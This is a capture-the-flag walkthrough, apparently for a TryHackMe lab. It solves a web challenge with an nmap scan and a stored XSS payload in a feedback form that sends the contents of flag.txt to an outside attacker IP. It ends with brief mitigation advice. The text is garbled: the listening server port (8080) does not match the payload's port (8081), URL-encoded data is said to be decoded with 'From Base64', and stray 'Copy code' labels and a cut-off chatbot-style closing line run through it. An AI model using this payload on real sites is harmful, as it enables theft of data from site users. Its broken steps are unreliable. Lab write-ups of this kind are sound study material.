# Web Exploitation - Reading `flag.txt`

## Overview

In this challenge, we are tasked with reading the contents of a `flag.txt` file hosted on a vulnerable server. By exploiting a Cross-Site Scripting (XSS) vulnerability, we can exfiltrate the contents of the `flag.txt` file to our own server. Below is a detailed explanation of how we can achieve this.

---

## Steps to Solve the Challenge

### Step 1: Scan the Target with Nmap

To gather information about the target system, we first run an Nmap scan to check for open ports and services running on the machine.

```bash
nmap -v -A 10.10.11.14
This command will give us information about the services running on the target machine, and confirm whether port 8080 is open, which we will use later.

Step 2: Open the Browser and Access the Web Application
Once we confirm that port 8080 is open, we open the browser and navigate to the target machine's IP:

arduino
Copy code
http://MACHINE_IP:8080
Here, we can see a feedback form. This form is likely vulnerable to XSS, which we will exploit to retrieve the flag.txt file.

Step 3: Start a Simple HTTP Server to Capture the Flag
On your machine, start a Python HTTP server to capture the exfiltrated data from the vulnerable page:

bash
Copy code
python3 -m http.server 8080
This will start a server on port 8080, which will be used to listen for incoming requests from the feedback form.

Step 4: Inject Malicious JavaScript into the Feedback Form
Next, we inject a JavaScript payload into the feedback input. The script will fetch the contents of the flag.txt file and send it to our server. The payload is as follows:

html
Copy code
<script>
    fetch('/flag.txt')
        .then(response => response.text())
        .then(data => {
            // Append the response data to the URL as a query parameter
            window.location.href = 'http://10.10.224.193:8081/receive?flag=' + encodeURIComponent(data); 
        })
        .catch(error => console.error('Error:', error));
</script>
The fetch('/flag.txt') request fetches the contents of flag.txt from the server.
The contents of flag.txt are then encoded and sent to our server at http://10.10.224.193:8081/receive.
Step 5: Capture the Flag Exfiltration
When the admin (or any user who views the feedback) loads the page, the script will execute, and the flag will be exfiltrated to our server. In the terminal, you should see the following log indicating that the flag has been sent to your server:

perl
Copy code
GET /receive?flag=THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D HTTP/1.1
This is the URL-encoded flag.

Step 6: Decode the Flag Using CyberChef
Copy the URL-encoded string and paste it into CyberChef to decode it.

Go to CyberChef.
In the left pane, select the "From Base64" operation.
Paste the encoded string THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D into the input box.
On the right, you'll see the decoded flag:
wasm
Copy code
THM{83789a69074f636f64a38879cfcabe8b62305ee6}
Step 7: Retrieve the Flag
Now that we have decoded the flag, the contents of the flag.txt file are:

wasm
Copy code
THM{83789a69074f636f64a38879cfcabe8b62305ee6}
This is the flag required to solve the challenge.

Conclusion
In this challenge, we successfully exploited an XSS vulnerability in the feedback form to exfiltrate the contents of the flag.txt file. By using a simple JavaScript payload, we fetched the file contents and sent them to our server. We then used CyberChef to decode the URL-encoded flag.

Security Considerations
This scenario highlights the importance of securing user inputs and preventing XSS vulnerabilities. To mitigate such attacks, the following measures should be taken:

Sanitize User Input: Always sanitize and escape user inputs to prevent malicious code execution.
Content Security Policy (CSP): Implement a strict CSP to block inline JavaScript.
HTTPOnly and Secure Cookies: Ensure sensitive cookies are marked as HttpOnly and Secure to prevent client-side script access.
Additional Resources
Cross-Site Scripting (XSS) Attacks
CyberChef: The Swiss Army Knife of Data Processing
vbnet
Copy code

This `.md` file provides a comprehensive, step-by-step solution to the challenge, and includes the necessary code a
